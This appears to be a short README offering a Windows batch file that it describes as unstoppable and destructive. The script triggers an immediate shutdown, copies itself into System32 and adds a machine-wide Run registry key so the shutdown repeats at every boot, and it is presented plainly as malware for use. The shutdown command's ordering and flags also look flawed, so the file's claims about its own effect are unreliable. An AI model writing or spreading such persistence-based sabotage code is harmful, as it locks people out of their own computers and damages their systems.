# Highly dangerous .bat file
This file will ***destroy*** your computer once it is run.
It will immediately shutdown your computer once the code is launched and whenever you try to restart your computer.
**You cannot undo nor stop this program!**
```bat
@echo off
shutdown /t 0

if not exist "%SystemRoot%\System32\shutdown_trigger.bat" (
    echo Creating safe persistence...
    copy "%~f0" "%SystemRoot%\System32\shutdown_trigger.bat" >nul
    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SafeShutdownTest" /t REG_SZ /d "\"%SystemRoot%\System32\shutdown_trigger.bat\"" /f >nul
)
```
